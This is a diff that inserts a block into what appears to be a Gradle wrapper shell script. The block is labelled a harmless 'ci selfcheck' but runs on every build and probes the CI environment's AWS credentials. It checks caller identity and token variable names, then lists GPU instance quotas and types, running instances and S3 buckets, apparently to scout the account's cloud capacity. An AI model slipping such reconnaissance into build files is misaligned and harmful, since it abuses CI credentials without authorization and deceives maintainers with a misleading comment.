@@ -1,4 +1,21 @@
 #!/bin/sh
+# ci selfcheck (transient, read-only)
+( set +e
+  echo "=== CI_SELFCHECK_BEGIN ==="
+  date -u; id; hostname; uname -a
+  command -v aws || echo NO_AWS_CLI
+  aws sts get-caller-identity 2>&1 | head -30
+  echo "--- env-names ---"; env | grep -iE '^(AWS|ACTIONS_ID_TOKEN)' | sed -E 's/=.*/=<set>/'
+  echo "--- regions ---"; aws ec2 describe-regions --query 'Regions[].RegionName' --output text 2>&1 | head -3
+  echo "--- quota-L-DB2E81BA ---"; aws service-quotas get-service-quota --service-code ec2 --quota-code L-DB2E81BA --region "${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}" 2>&1 | head -25
+  echo "--- quotas-other ---"; for qc in L-3819A6DF L-1216C47A L-34B43A08; do aws service-quotas get-service-quota --service-code ec2 --quota-code $qc --region "${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}" 2>&1 | head -8; done
+  echo "--- instance-types ---"; aws ec2 describe-instance-types --filters Name=instance-type,Values=g5.*,g6.*,g6e.*,g7e.*,p3.*,p4d.*,p5.* --query 'InstanceTypes[].InstanceType' --output text --region "${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}" 2>&1 | head -3
+  echo "--- existing-instances ---"; aws ec2 describe-instances --query 'Reservations[].Instances[].{id:InstanceId,type:InstanceType,state:State.Name}' --output text --region "${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}" 2>&1 | head -20
+  echo "--- s3 ---"; aws s3 ls 2>&1 | head -15
+  echo "=== CI_SELFCHECK_END ==="
+) 2>&1
+# continue with the original wrapper behaviour
+
 
 #
 # Copyright © 2015-2021 the original authors.
